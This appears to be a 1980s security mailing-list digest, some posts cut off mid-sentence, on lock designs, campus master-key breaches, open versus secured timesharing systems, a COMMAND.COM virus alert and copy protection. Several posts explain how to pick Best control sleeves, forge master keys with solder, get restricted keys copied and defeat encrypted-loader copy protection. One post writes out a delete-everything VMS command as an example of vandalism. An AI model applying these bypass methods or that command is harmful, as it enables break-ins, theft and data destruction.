that such a configuration is harder to pick.  Well, they tried.  The
severe limitation here is the number of cuts per pin -- the total travel
isn't that far, so you can only have three or four distinct cuts [i.e.
dimple depths] per pin.  They compensate by using more pins.  A similar
method is found in Fichet cylinders, which use a key with an H-shaped
cross section to address four rows of pins.

The other kind, with the slanted cuts, are Medeco or Emhart.  Ahh, Medeco.
I've recently had an in-depth go-round with a few of these myself after they
installed them on my office area.  These are in theory "unpickable", because
of a rather complex sidebar system and lots of "false" positions that the
parts can get into but still not open the lock.  The configuration is
similar to a standard pin-tumbler lock in that you have pins and drivers as
usual.  The difference is that the pins are chisel-cut, so that when they
drop into the V-shaped key cuts they are forced to rotate to conform to the
cut orientation.  Into the right side of each pin are milled one or more
vertical slots, about .025 inch deep for the "real" slots and less for the
false ones.  Located just to the right of the pins is a sidebar which
normally protrudes into a slot in the shell.  The sidebar has six little
flat teeth, each of which sticks through a small hole directly at the side
of each pin and each of which is slightly narrower than the pin slots.  If
the pins are rotated such that all the deep slots line directly up with the
sidebar teeth, the sidebar can fully retract into the plug, allowing it to
turn.  If any tooth encounters the side of the pin, or even a false shallow
slot, the sidebar blocks rotation.  All this is in *addition* to the regular
pin-driver action, which is further confused by liberal use of mushroom
drivers and funny shapes at the top of the pins.  The pin tops are slightly
beveled so that they bear against the driver with a small contact area.
This allows easier rotation.

However, all this is perhaps not as hairy as it sounds.  The rotations are
limited to zero and plus/minus 30 degrees or so.  I believe there aren't
a lot of different cut heights, either.  While ding near impossible to pick,
it's possible to fool with it until it cocks over into some false positions.
At this point it's possible to get some information about the insides.
Very occasionally someone does get lucky and successfully picks one open,
but not at all repeatably.  The blanks for these are usually restricted, the
cut keys are registered with the company and have "do not duplicate" stamped
all over them, and not every place that does keys has a Medeco machine, which
is apparently expensive.  Creative sheet metal work can get around this, but
the tolerances involved are quite exacting.  One thing Medecos have going for
them is that they are *very* nicely machined; if you removed the sidebar
assembly from one it would still be a pretty decent lock.  [Note that if you
remove the sidebar, pin rotations no longer matter.]

Subj:	[3831]  Re: Why secure systems? 

[You wanted flames.. Here comes one ]

Stallman's comments may make sense for a small, cooperative community,
where everyone has a chance to know everyone else, and everyone
involved has at least some interest in the "common good".

However, not all computer-using communities are like this, and there
are very good _economic_ reasons (involving the cost of hardware) why
many cannot be set up this way.

Computer security is somewhat like locks on doors; it isn't perfect,
but it serves to deter vandals.  Most people can't get through them
without keys. People who can get through locked doors generally fall
into two categories: responsible (locksmiths), and irresponsible
("criminals").  [There is also a very small group of "amateur
locksmiths" in the middle who have some of the skills necessary, are
officially part of the criminals, but only apply the skills for
"exploration" of interesting areas.  These people may make up a fair
proportion of this list, but are probably not a significant proportion
of society at large; in any event, they generally do no harm to
society].

To argue that removing locks is the best way to eliminate crime makes
no sense.  Perhaps it would work in a truly cooperative ``socialist''
society, where everyone put the good of the whole ahead of personal
gain.  There are examples of small groups where this holds to a
certain extent (for example, a typical family unit), but there are
very good reasons why a large-scale version of such a society, cannot
exist.

What does this have to do with computer security?

What it boils down to is that the shared use of any resource
(includiing computers) by a group of people who do not have a
compatible set of goals requires some form of internal
compartmentalization or ``security''.

For example, think about a timesharing system or shared fileserver
being used as part of a class.  It is certainly in the interest of the
students to prevent others from destroying their work.  It may be in
the interest of the students to _not_ allow other people to copy their
work (at least, not without permission); it is certainly in the best
interests of the teacher to provide a means to limit un-credited
plagiarism.

If the class involves individual work, then the solution is simple -
have everyone put all their work on removable media, which they can
carry around with them.

If, on the other hand, the class involves work in small teams (as is
the case in the software engineering and compiler courses around MIT),
the use of removable media makes cooperation impossibly hard, and
there needs to be some way to set up common file space which only the
group members should be able to access.

A security/protection system which prevents people from doing work is
clearly counter-productive; studies have shown that programmer
productivity increases when there are no internal security barriers
which get in the way.  The key is to design a security system which
provides enough flexibility and is easy enough to use so that it
doesn't get in the way of people trying to do work.  Of the systems
which I have used, Multics comes the closest to this goal [1].  There
are far too many poorly designed protection systems out there -- UNIX
is one of the really bad ones.  

				Bill Sommerfeld (MIT '88)
				MIT Project Athena

[1] Multics AIM (the access isolation mechansim, a non-discretionary
access control system), is the only big wart -- it was designed to
prevent trojan horses from letting classified information escape, and
instead is probably a big waste of the users's time.  It was also
kludged in after the original design.  Fortunately, it doesn't have to
be used.

        2. surreptitious patching (Trojan horses).

Application software is stored in an encrypted form.  A special loader takes
the encrypted image, decrypts (thus verifying), loads, and starts it.  As an
added bonus, the loader may also record accounting information.

The loader must provide its own security by

        1. verifying it is not running on a pirate machine,
        2. not divulging the encryption password, even under interrogation,
        3. ensuring that its own image has not been patched.

Students may copy software, since it is useless without the loader.  An image
can only be modified if both file security was compromised *and* the intruder
can decrypt, patch, and re-encrypt the image.

The procedure is almost transparent.  The user must prefix the usual command
with the name of the loader, for example, if the loader is called "RUN", the
user must type "RUN VISICALC".

those sound a lot like one of the old sargeant systems. basically what they
had was three intersecting sets of pins 120 degrees apart, the idea was that
you had to pick 3 sets to get in, without any guides for the pick. The

Has there been any previous discussions about this? If not, how about

down to timers for your lights and a dog in the yard.

Subj:	[1404]  PC security

There are several systems on the market that will provide a security
function for a PC with a hard disk.  Some of these systems are quite
sophisticated; including such features as user authentication, user
login and program usage audit trails, access controls for files and
directories, data encryption, access controls for the floppy drives,
etc.

I have a system called ENIX.SYS from VuTek on my PC at work.
Unfortunately, it's an orphan now.  One of the features that it had that
would be particularly useful in the PC lab was the ability to create
directories that were execute only.  Definitely a deterrent to software
theft.

ENIX.SYS is a hardware based system with a device driver to interface to
DOS.  Currently, I am only using the hardware to prevent unauthorized
persons from using my PC, the rest of it isn't of much value on a single
user system.  I was using the automatic data encryption feature, until
the first time I ran Disk Optimizer and totally scrambled my hard disk.

Anyway, these systems do work.  But you need to be very careful in
selecting one.  I would definitely require an evaluation unit before
purchasing one.  Prices range from $200 to $2000 per PC, it all depends
on how much the data/programs are worth.

Subj:	[1345]  RE: the KEY Discussions

The first lock you mentioned, a seemingly blank peice of metal with
dimples cut in the side is most likely a Kaba or Dom. They work the
exact same way as a regular lock except instead of the pins pointing
top to bottom they point side to side and the dimples cut to varying
depths substituted for the notches in the top of a conventional key.
This way there can be more than 1 set of pins. I have seen then with
4, more could be done easily.

The second type is a medeco. The notches in the key are cut at an angle,
there are 3 orientations labeled Left, Right and Center. The pin that
contacts the key is wedge shaped instead of pointed, so the pin has
to be in the rght orientation as well as the right height. Each pin
has a notch in the side of it, when they are all at the right orientation
the notch is pointing perpindicular to the lock. There is a bar in the
side of the lock that has fingers that fit into each of the holes. When
the pins are all at the right orientation all the fingers slide into
the slots, the bar slips to the left and if the pins are all at the right
height as well the lock can be opened. Medecos are effectively pick proof.

Actually, if you have an operating key, you need not remove the lock cylinder
in order to determine all the pin splits in it.  Obtain one extra key blank
per pin column (7 for the typical institutional Best lock); duplicate the
operating key except for one column on the blanks, omitting a different
column on each blank.  Then, for each blank, try it with the omitted column
cut to number 0 (high), then 1, then 2, ... and record which bittings open
the lock.  That tells you what the splits are in that column.  The whole set
of trials tells you what all the splits are in all columns.

The best way to cut the keys is with a code machine; next best is to duplicate
from a depth key set; third best is to set up an extra cylinder plug with just
one pin of the desired length in the appropriate column, and file down the key
until it brings the pin flush with the plug.

on the denelcor hep supercomputer (since defunct) in 1984.  there
were several technical papers by mullin and by coppersmith at ibm
yorktown on the method of attack.  our paper on the implementation
which includes a description of the algorithm but not the gory details,
was in the proceedings of the international conference on parallel

Well, as a Computer Security person i look at this a little differently
to say the least.

There may be some system admin or security people that run a very
tight ship(computre system wise).  However, i agree that the users must
be able to get their work done in a timely and efficient manner.

But i have a problem with just making it an "open" system for just
anybody to access. In the DOD we have systems that store and process
National Security Info as well as Sensitive and Privacy Act data.

Certainly we have the right to insist that users have a need-to-know
for these type files stored on a given system.

A user also has the right to decide which other users are going to be
allowed access to the files he/she creates. We just cannot open up
all the data on the system to every user just because they think it
would be "nice"!

There is a serious problem now with the management of the SUPERCOMPUTER  
systems in the U.S., as the universities want to open the system up to
any scientist user in the world(including the users in the USSR).
This can be a real problem since these computers can be used for
military weapons APPLICATIONS.  Should we deny this type of user access to
these powerful tools?

In conclusion, i think that we have to strive for a happy medium while
trying to balance the need for Computer Security with the users requirement
to get the job done. But if i am going to err, it will be on the side of
Computer Security and the protection of data stored on the system!

Subj:	[945]  Picking the Best control shear

According to some books on the subject of interchangeable cores it is
possible to pick the control shear only by applying tension to the
control sleeve only.  By applying tension to the control sleeve only, the
pins will only bind at the control shear.  You may ask, how does one
apply tension to the control shear?  Best cores have holes
in the core sleeve for ejecting pins, one merely modifies a tension 
wrench to fit into one of these holes such that it only contacts the
control sleeve (the upper most sleeve layer).  If your wrench goes into
the hole too far you will be applying tension to the entire core assembly
which will get you no where fast.

I have yet to try the above technique, but logic seems to say that it
should work.

   I must confess that this rings truth to me.  It _does_ resemble a
totalitarian organization.  As a means for an efficient execution of the
tasks which a computer is typically used to perform, this form of organization
is a natural answer to the problem at hand.  Doesn't make it right, but it
_is_ efficient.  Usually, the running of a computer system centers around
making sure a known set of programs executes as needed.  Additionally,  the
administration is responsible for the development of new programs and to
maintain the existing system in response to dynamic needs as defined by
the owner of the computer.  The oversight of a running system is relatively
simple and easy compared to maintenance and development, and requires no more
sophisticated form of organization than the totalitarian one which typically
exists.  That is _why_ it exists (or at least one reason).  The second main
task, maintenance and development, figures a smaller role in the system of
things (although it gets far more notice), and can also be handled efficiently
by "a small oligarchy."  Does efficiency justify the occasional unfairness
implicit in an organization where the few rule the many?  Probably not, in a
theoretical sense.  But in a practical sense, things are different.
   You can use a political organization as an allegory as convenient, but
remember it is _only_ an allegory;  and perhaps, not a very good one.  In a
political structure the assumption most Americans assume is that the
organization exists to serve the people.  This is not necessarily the case
with computer organizations.  In the political world many have adopted the
idea which exists in our own Constitution that man has by natural law
a certain set of inalienable rights which it is the responsibility of the
political organization to defend and ensure.  This is certainly not the case
in a time-sharing computer organization.  The users are using a machine owned
by a 'legal entity' (ie. a person, a company, the State or National government)
and are not participating in anything as basic as the right to a free and
peaceful life.  The users _do_not_ have a certain set of inalienable rights
granted by natural law in the use of a someone's computer, and cannot expect
treatment similar to that given them by their political government.  This means
that if you are repressed, you _do_not_ necessarily have the right to object.
If you are not among the privileged few, you _do_not_ necessarily have the
right to rant and rave your inequality, nor expect that things will (or even
should) change for your approval.
   In sub-conclusion, whereas the typical organization is similar to a
totalitarian government, you do not have any natural right to expect or
demand 'better' treatment.

   These paragraphs, and most of the rest of the excerpt, argue that a
'free system' is better than a traditional system with restrictive security
measures.  For 95% of the world's computers, this is simply not true.  And
perhaps Stallman would agree:
      "We should put military secrets, bank records and the like
       on computers with strict security.  For other activities,
       we should have computers that are free of security, and
       free of its burdens."
The trouble is that almost all systems consider their data just as important
and confidential as any bank.  And I argue that they _should_ have the right
to decide how confidential their data will be, using strict security, because
it is _their_ computer.

   Now, if you restrict your generalization of "a typical timeshared computer"
to computers used for educational purposes, with no data of any sensitive
nature, then the argument immediately becomes more tolerable.  Presumably,
with no sensitive data to protect, the administration which owns the computer
should allow the users a 'free system' in which to work and learn.  The users
in this 'free system' would be responsible to no one for their actions, would
have free access to all files of any nature, would be able to allocate
resources on a first come, first serve basis, and would not be limited in the
content and use of their files and programs.  And such an environment would
be conductive to the growth of "responsible engineers rather than crackers."
   This sounds very nice, and would likely be quite acceptable in an
environment of responsible engineers, but when put into an environment of
18 - 22 year old students at a typical university, comes out only as the
pipe dreams of an old UNIX hacker (pun intended).  At this university, which
I judge typical, there _are_ people who would delete a person's files given
the opportunity.  Maybe the computer users at MIT were exceptionally
considerate, but at the typical university the typical user is a student
using the computer only for the word processor, and has little knowledge and
less respect for the computer, it's structure, and it's users.  Nevertheless,
I suspect that vandalism would still be rare (my basic optimism in humanity :-))
but when it did occur it would be drastic ( $ Delete *:[*]*.*;* ).  Should such
disasters be _allowed_ to occur?  More often, I suspect, would be the individual
disasters where Mr. X gets Mr. Y pissed off, and Mr. Y is a total jerkface,
so Mr. Y deletes, or worse, encodes, all of Mr. X's files.  Perhaps a user
prefers that his resume, and his letters to his wife, etc., are not available
to the general public?  Should we be limited to simple trust that no one will
look into his private directory of files?  There are problems in all of the
freedoms in your free system, not simply the obvious one concerning file
protections.  You let slip an indication of a potential problem in your
article:
    "And if a stranger came to the lab and wanted to play with the
     computer when it was not fully needed by us--we let him!"
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
What's this I read?  Who is "us?"  Some of the users who are all treated
alike?  How can anyone "let" another equal user use what is rightfully his to
use as an equal user?  Oh, he's a "stranger."  How can he become one of the
equal users?  Popular election?  Have him pass a test?  Require n number of
hours of computer use?  Pardon my sarcasm, but what is obviously needed in
this case is an authority-- some person or group of persons whose responsibility
it is to initiate strangers into users.  This authority is also necessary to
resolve an innumerable list of potential conflicts among users, even if they do
all behave as responsible engineers.  Who is to decide the needs of the many
users of the computer?  Who is to tell Mr. Y that he has used the printer
long enough?  Who is to tell Mr. Y that his Graphic simulation is very nice,
but it takes up too much CPU time?  And when they do not behave as responsibly,
who is to tell Mr. Y that his Random Write program (which he uploads from
floppy on occasional bad moods) is improper and destructive use of the
computer system?  Who is to tell Mr. Y that the female students (as a whole)
do not appreciate his little pictures which he mails to them, or causes to
print to their screens when they log in?  Who is to tell Mr. Y that if he
doesn't stop being a total jerkface, he won't be allowed to use the
computer anymore?  You _need_ some form of authority beyond and _above_ the
normal abilities of the regular user, with the power to enforce it's decisions
against a user who may not agree with them.  This is what 'security' does.
It also prevents Mr. Y from ever being able to do his misdemeanors before
any damage is done.  It protects the integrity of those files which the file
owner desires to remain safe, while still allowing freedom where it is
desired.  It protects the ignorant from their own errors, and it protects
others from a user's ignorance.  And best of all, it _can_ be turned off
if the protection is _not_ wanted.  But many of the system level protections,
such as file quotas, are in the domain of the group with authority which
governs and protects the system.
   For an educational computer sans sensitive data, the 'group with authority
over the system' need not be a small oligarchy resembling a totalitarian state.
It could very well be a Bulletin Board program which allows the posting of
proposals by users and the analysis of a popular majority rules vote.  It could
be an elected assembly, with terms of office and specific rights and
prohibitions.  It could be a single individual determined by the 'most creative
use of the system as expressed in Assembly language.'  The point is that this
kind of computer environment can be governed by any type of organization, so
long as the computer is put to effective and proper use as defined by the
owner(s) of the computer.  A completely free system without protections and
without any authority would not serve this purpose.

    Yes, this is at the same time wonderful and scary and sad.  And also true.
The difference here is that these computer systems _will_ be for the purpose
of serving the people, and thus the people should have more of a say in how
they will be used, and how they will be governed.  The old days of Gripe Logs
(public display of user complaints and the responses given by those in
authority) will not suffice in these future days, and some provisions for
user objections, public access and input towards policy, public 'trials' to
determine guilt or innocence for misdemeanors, and a more sophisticated
structure of organization with the checks and balances our own government is
well known to have will need to be initiated and tested, and finally used in
practice.  Who knows, the organization which emerges from these public
computers may well be used as the template with which new governments are
formed in the 'Final Frontier', just as the corporate organization was used
as a template for our own budding American government.  If such becomes the
case, it is my sincere hope that much forethought goes into the development
of such a system.  And in the interest of _preventing_ a flame war, which is
much too violent a phrase, I pose the following question:
      What constitutes a secure and _just_ security system for a
      public service computer system (network?) which by definition
      has significant consequence over the lives of the people
      whom it serves?
One thought that immediately comes to my mind is the old question of who
will police the police?  How much access should 'the police' have, and how
can it be enforced?  What system of input would effectively reflect the
opinions and attitudes of the people served?  How can a process analogous
to a judicial system be executed?  Can any computer system ever be physically
secure, given the range of access needed (public to a large group of people
spread over a large area)?  I could go on and on and on and on .......
Any thoughts out there that may resemble answers?

Actually, if you're really into Best locks, you should make a special
tension wrench that grabs onto the holes in the bottom of the plug sleeve
corresponding to the control plug.  This makes picking the control
shear line fairly easy.  Some Best locks use spool pins, but a competent
lock picker can cope with that too.

>One had no slots, per se. Instead, it essentially looked like a blank with a

Sounds like the Sargent KESO system, which soon had some imitators.
The blank cross-section is a squashed hexagon, with dimples milled
into the flats at positions matching pins in the plug.  There were
three sets of pins (the key was reversible).  All three had to line
up their splits along the plug shear line before the plug would turn;
otherwise it is just the ordinary Yale tumbler lock principle.  The
improved security was due to the restricted blank, the difficulty of
duplicating or even producing a cut key, and the difficulty of picking
three simultaneous shear lines.

>In other words, instead of just making the cuts at an angle perpendicular
>to the key, the cuts were offset at angles of 0, +5 and -5 from the 
>perpendicular.

Sounds like the Medeco lock.  Its pins have wedge bottoms instead of
the usual cones; the wedges cause the pins to twist, and since the
pins are offset from the center of the plug (if I recall correctly),
they have to be properly twisted to align smoothly with the shear line.
There are also some systems like this with grooved pins and even more
elaborate mechanisms.

Don't forget the "sidebar" locks used on current GM automobiles.

There is also the Chicago "Ace" lock (with tubular key) often found
on vending machines, and variations on that theme, including one
with concentric nested pins.

All these locks can be picked, with varying degrees of difficulty,
by someone who understands their construction and general locksmithing
principles, who has or can make the necessary tools, and who is willing
to spend the practice time required.  There is a common opinion that
any lock involving mechanical principles activated by inserting some
sort of key into a hole is in theory pickable.  The most secure lock
systems I know of that are in general use involve "card keys" and have
computers that log lock activity.  If you couple one of these with some
form of personal validation (hand geometry or retinal scan), that's
probably the best you're going to be able to do.

Subj:	[829]  Re: master key security

You wouldn't need to do anything as drastic as saber sawing to
steal the lock.  While you need a change key to remove the core,
you can pull the whole cylinder if you have the door open without
damaging anything.  You then take it home and crack it open.  If
you don't have a key, you can open the door by some forcible means
or you can just rip out the cylinder.  There is a device called
a K-tool that I have used exactly once.  It is a piece of metal
that slides over the cylinder.  You place the end of a halligan
bar into the slot on the K-tool and then hit the whole thing with
a heavy object (the flat end of an ax works well).  The lock comes
out of the door in one easy motion.

Subj:	[2253]  Re:  master key security

I'm a student at the College of William and Mary, and I can say from more-or
less first-hand experience that a college administration's reaction is to
merely shrug their shoulders and cross their fingers in the wake of a fairly
major breach of master key security.  Quoting from our campus newspaper,

     "Richard Cumbee, chief of campus police, reports that a master key to the
College is missing.  The key was reported stolen November 5 some time between
10am and 1pm, from a key ring left on a Buildings and Grounds supervisor's
desk.  According to Cumbee, the key can open approximately 75 percent of the
doors on campus.  Police have a suspect in the case, and have issued a
trespassing warning to the individual.  Cumbee stated that police have 'no
indication of a history of violence associated with this person.'  Cumbee
also said that, although the key is at this time not recovered, the police
have taken several steps to ensure campus safety.  The department is monitoring
all reports to see if a master key might be involved.  Additionally police
notified certain areas of the College to keep on the lookout for suspicious
behavior.  Cumbee added that no locks will be changed at this point."

I'm of the opinion that it's about time for the college to give serious
thought to re-keying the locks involved.  I know it's expensive, but I would
think that the risks that they are taking by NOT re-keying the locks far
outweigh any short-term expense involved.  A question for those more
well-versed in the design of a large-scale lock installation:  am I correct
in thinking that it would be within the realm of possibility for our
locksmiths to re-do the master keying in such a way as to avoid the need
to cut and issue new keys to residents (i.e. change ONLY the master keying)?
Thanks for the information -- and I hope this tale was of some interest.
If so, let me know and I'll keep the list updated on what happens.

might have an opinion (uh-oh! I'm asking for it) on the worth of the
so called 'home locksmith' courses that one sees advertised in magazines.

	I have been looking into replacing some locks for a small business

however, this might be a legitimate excuse to learn something about a
topic that I have always been interested in.

	I would rather not spend a great deal (I do not recall the cost)
on a home course, unless I would actually get some sort of certification
that would be respected (I don't know what that would be-- maybe 
certification by a National Association of Locksmiths, or something?).
Also, if I go through on of these programs, will I be able to purchase
equipment as a legitimate locksmith?  I don't want to waste my time, I
can do that without spending a lot of dough.  If anyone has any experience
with these courses, or if someone could recommend a better alternative 
I would appreciate it.

I am curious as to the operation of a normal auto alarm. I know that most
of them use some sort of sensor ("black box") that I believe is installed
between the battery and the rest of the car. My question: how does
this "black box" work? When a door or trunk is opened is triggers this
sensor and eventually causes the alarm to go off. I am thinking about
building an alarm system when I get time and would appreciate
any general advice and a possible circuit diagram of this misterious
"block box".  With current draining from the battery when a car is 
off (dashboard clocks, radio memory etc...) I don't see  how a sensor
could detect a change in this current.

I doubt that your central computing service is trying to put "port

facilities. Since they probably have this funny thing called a "budget"
to work within, the accountants most likely have forced them to find
ways to equitabily charge out resource usage. I suspect that YOUR
department head would have trouble if the comp center came to him/her
and said, "oh, we're going to charge your department $40,000 for
network usage which we cannot account for..."

I don't think the issue is security in central environments. It's
just poorly managed central environments that don't serve user needs!

I'm not sure what you mean, so I'll tell you about both light amplifiers
and infrared devices.  Amplifiers are nice in that they are passive (no
one can find you by your light source) and can provide better images,
but IR is much cheaper and pretty effective for most applications.  They're
not as expensive as you might think if you're smart about shopping around.
First, if you're looking for second hand stuff, avoid first generation
(multi-tube or multi-stage) light amplifiers -- they just don't work
that well.  Second, try electronics houses that don't specialize in
surveillance or police stuff.

Light amplifiers:

SEC (Standard Equipment Company) / 9240 N. 107th St. PO Box 2360 / Milwaukee WI
53224 : NVS-80 75-1200mm monocular night scope (for mounting on a camera) $2795
[If by sniperscope you mean something intended for mounting on a gun (now why
    would anyone want that?) then try their NVS-520 for $4495]

Edmund Scientific (Great source, low prices!) 101 E. Gloucester Pike
   Barrington NJ 08007: Night Vision System K31073 75mm
   including eyepiece $2495

InfraRed stuff:

ETCO Electronics / North County shopping center/ Rt 9 north/ Plattsburgh, NY
12901 : Excellent infrared viewer and source powered by 4 D batteries.  Light
weight, possible to take excellent photos, field of view about 150 ft.  Price
is $279, + $10 for a battery pack and $15 for a 10X objective.  There may be
an even cheaper kit version available now.  Great deal!

Edmund also has a variety of IR sources, conversion lenses and viewers.  You
could add a high power IR source to the ETCO viewer and have a gadget that
the "surveillance retailers" sell for $4000+ for less than $500.

Happy viewing....

Although AIM was added to Multics after the initial design and

Subj:	[2413]  virus alert

[This has been all over numerous other mailing lists; some of you may not
have seen it yet.   _H*]

                    Virus Invades Lehigh University
       
  Last week, some of our student consultants discovered a virus program
  that's been spreading rapidly throughout Lehigh University.  I thought
  I'd take a few minutes and warn as many of you as possible about this
  program since it has the chance of spreading much farther than just our
  University.  We have no idea where the virus started, but some users have
  told me that other universities have recently had similar problems.
       
  The virus: the virus itself is contained in the stack space of COMMAND.COM.
  When a pc is booted from an infected disk, all a user need do to spread
  the virus is to access another disk via TYPE, COPY, DIR, etc.  If the
  other disk contains COMMAND.COM, the virus code is copied to the other
  disk.  Then, a counter is incremented on the parent.  When this counter
  reaches a value of 4, any and every disk in the PC is erased thoroughly.
  The boot tracks are nulled, as are the FAT tables, etc.  All Norton's
  horses couldn't put it back together again...  :-)  This affects both floppy
  and hard disks.  Meanwhile, the four children that were created go on
  to tell four friends, and then they tell four friends, and so on, and so on.
       
  Detection: while this virus appears to be very well written, the author
  did leave behind a couple footprints.  First, the write date of the
  command.com changes.  Second, if there's a write protect tab on an
  uninfected disk, you will get a WRITE PROTECT ERROR...  So, boot up from
  a suspected virus'd disk and access a write protected disk - if an
  error comes up, then you're sure.  Note that the length of command.com
  does not get altered.
       
  I urge anyone who comes in contact with publicly accessible (sp?) disks
  to periodically check their own disks.  Also, exercise safe computing -
  always wear a write protect tab.  :-)
       
  This is not a joke.  A large percentage of our public site disks has
  been gonged by this virus in the last couple days.

Subj:	[2273]  Student Lab Security and Preventing Trojan Horses

I wonder about all these precautions to stop students from copying
software.

I agree that some common practice has to be established like making
sure students understand that copying can be construed as a crime,
collecting and signing out software (protecting the physical disks and
manuals is obviously desireable) and all that. I just wonder what
motivates people to spend lord knows how many hours writing magic
encrypting loaders and things like that.

Did the manufacturers ask you to do this sort of thing? Did you feel
that it was the only way to protect yourself from some possible
litigation? Did you seek legal consul from the University before
investing all that time and trouble (I assume at the University's
expense)? I realize it may have been worthwhile (in your eyes) just to
prevent trojan horses, so don't take me wrong, I'm honestly curious.

I suppose the real problem with these systems is that they don't have
any rational file protection schemes, I've certainly never been
tempted to go to such lengths on systems which did.

I also wonder how much one can just say "hey, if the manufacturers
cared about such things they'd do something about it, they can't ask
me to subsidize their needs." Copy-protection is not an acceptable
"something".

For example, I was at a University level meeting with our Macintosh
rep and this very subject came up. Someone in the room started going
on and on about schemes to prevent copying. I interrupted and said (in
a semi-official tone of voice) the University was more than willing to
follow whatever guidelines Apple and/or the software vendors recommend
to prevent such potential problems and manage these measures
responsibly. But we refuse to show any *more* interest in the problem
than the vendors do. If you can supply me with anything written
discussing their position on such things I would be more than happy to
study it.

The apple rep basically nodded his head, I'm not sure because he
agreed or just agreed that there was nothing more that could really be
said (probably the latter), but it ended there.

Subj:	[1880]  Re: Student Lab Security and Preventing Trojan Horses

Derek Andrew, U of Saskatchewan, described a scheme for protecting
microcomputer software that uses a separate loader program, so the
only image on disk is encrypted.

Some commercially released Macintosh music programs were protected
using this scheme. I recently recieved the source code for a desk
accessory called FixJT (Fix Jump Table) that removes the copy protection
from such programs. Here is how it works:

Since the program must reside in memory in an unprotected form in
order to run, and since desk accessories run in parallel, in the same
memory space as applications, FixJt just writes out the in-memory
image to disk in a form that the operating system can run directly.
(It cycles through the Mac's table of executable segments, marking
each one as writable, and writing it to disk. It also turns off the
handling of clock interrupt tasks, so if the program set a watchdog to try
to defeat FixJT, that watchdog won't get triggered.)

Any application program that allows the running of desk accessories
and is protected via an external encryption utility can be deprotected
by such a scheme. The application must have direct copy protection
code built-in, to discover the presence of some non-copiable resource
frequently, and continually decrypt one portion of itself to use, and
re-encrypt other portions of itself to hide them, so that at no time
does a complete, decrypted copy of itself exist in memory, that a
watcher desk accessory could just write out.

Oh, how I know this problem.  Within the last few weeks we've had three
locks stolen from doors in our building, one with computers all over the

of computer theives on it.  The locks were simply torn out (Sargeant locks).
I spent days hiding equipment while we wait for a locksmith to install
a few new (good) locks in a few rooms.  If they don't get it done by the
upcomming holiday, we're doomed.
We know they are after a master, the locksmiths know they are after a
master, and it makes me soooo mad!  The security of my building is 
compromised, and my babies stand the risk of being gutted, from model A PC's

I just hope that they leave the lock-down cables that will be chopped
where they chop them so that we are only stuck with a $250 deductible

Subj:	[1270]  Payphone locks

  Regarding picking a payphone lock it is possible that this person
has made a very special tool that would make it much more likely
that one could pick a payphone lock. 
  Payphone locks use a 9 or ten lever, lever lock. The levers are
very thin and close together to make picking difficult and also have
a ratchet that catches the lever if it is raised too high during 
picking. One could make a tension wrench that also allows the
resetting of the ratchet, like when a key is inserted but you
would have to have a lock from a payphone in the first place.
Then one would need a special tool to throw the bolt on the coin
box cover, but that is a relatively simple item compared to the

  By the way the coin box is a removable sealed box that has a special
seal on it.  When the coin collector comes around he pulls the
full box out which closes itself as it is extracted from the
actual payphone housing.  He then inserts a empty and open box
back into the housing which then primes it so that upon removal
it seals itself untill it is reset, which can only be done by
breaking the seal on the box.

>It must be very expensive to rekey all the locks on a campus.

It is.  Here at UWM when the college rekeyed one building with 80 faculty
offices and some 40 labs, the cost was of the order of $25,000.

The problem with master keys being lower than the sub masters deals with
the way the keys are installed by the locksmith.  S/he "builds" the keyset
by inserting a master key in the lock cylinder and adding slugs for the
local and submaster set, finally adding the slugs needed to make the
master. The cylinder then is flat across the top and may be inserted 
into the stationary door part.

If the master was higher than the submaster, the locksmith would have to
make several keys for the building of the cylinders.  Lethargy rules, 
the master is low and easy to make from any submaster.

An even easier way to bust the system is to take the keys, usually
marked "do not duplicate" to a shop for duplication, after taping over
the above marks with a legend such as "elevator" or "garage".
Most shops will gladly duplicate such a key.

Subj:	[3417]  Re: Internal setscrews

The "from the inside" setscrews don't protect padlocks, which are by far the
most vulnerable locks in most Best and Falcon systems.  As many bicycle owners
know, cutters which can remove a padlock from a hasp are too easy to come by,
and the words "hardened steel" are essentially irrelevant. One way to deal with
this problem is to use a separate control key and mastering system for padlocks
and other unsupervised areas. 

The control key is implemented as a sleeve around the plug, where the plug is
the part of the lock which rotates when the lock is normally operated.  This
sleeve is about 1/8" thick for the part which faces opposing circle of the
figure 8 profile of a Best lock, and includes the tooth which holds the core
into the lock.  This describes a bit more than 60 degrees of the sleeve, the
other 300 degrees are also present, but the metal is much thinner, and thus
less noticeable. 

The sleeve along the bottom of the keyway typically has five or six small holes
(one under each pin), which may be intended for use by the locksmith when
assembling or rekeying a core.  These small holes permit making a specialized
wrench to apply torque to the sleeve without applying torque to the plug.  Such
a tool makes it relatively easy to pick the sleeve, thus removing the core. 
The core operates in only one direction, turning about 20 degrees, since the
tooth must withdraw into empty space within the core. 

The Best locks are well made, so it is easy to disassemble and reassemble them.
Penetrating such a system can be done without property damage.  If the system
stamps a code on each lock and key, it is often possible to derive the whole
system by examining two or three keys and a single lock.  This could be made
more difficult by assigning the codes non-sequentially, but the systems which I
have seen didn't do this.  The Best locks that I have seen have 5, 6 or 7 pins,
each of which has 10 possible stopping points 1/80" apart. Because the thinnest
master pin is 1/40" thick (to keep from turning sideways), only the even or odd
numbered stops are used by any given pin (but the control key can violate
this).  With one stop reserved for the grand master, 4 stops per pin are
available for pass keys.

The master key has at least one cut which has more metal than any pass key, so
that griding the keys down never can produce a master key.  When submasters are
provided, the grand master can't be made from any submaster, and so on. 
However, metal can be added to a key using silver solder, which can easily be
filed down and has a reasonable lifetime (regular solder is too soft, so the
lifetime would be only a few uses).  The solder makes the key rather
conspicuous when the campus cop asks to see your key ring, though.  I think you
would need acid-core solder; it's been a while. 

The usual disclaimer applies: don't try this at home, it's illegal.  Knowing
how to pick locks is only illegal if you exercise the skill on someone else's
lock, but there are places were possession of the tools without a license (a
locksmith's bond, or some such) is a felony.  It can be a very useful skill
in emergencies where forgiveness is easier to obtain than permission; every
boy scout should have a locksmithing merit badge.

Subj:	[3484]  RE: Bumper Beepers.

   
       And by the way, US Citizens have no reasonable expectation of privacy
       regarding movements tracked in public, said the Supreme Court in 1983:
       US v. Knotts, 103 S. Ct. 1081 (1983).
    
    However, I imagine that installing a beeper on someone else's car without
    their knowledge or permission is trespassing at the very least.
    
That's an interesting question!  US v. Knotts was a case in which the
police attached a bumper beeper to a car and followed it.  It was held
that there was no violation of the 4th amendment because there is no
reasonable expectation of privacy of movements in public.  There was
a case decided shortly thereafter where a beeper was placed inside a
package (containing drugs, I believe) and the police followed the package
and then traced its location inside the suspect's home.  That search
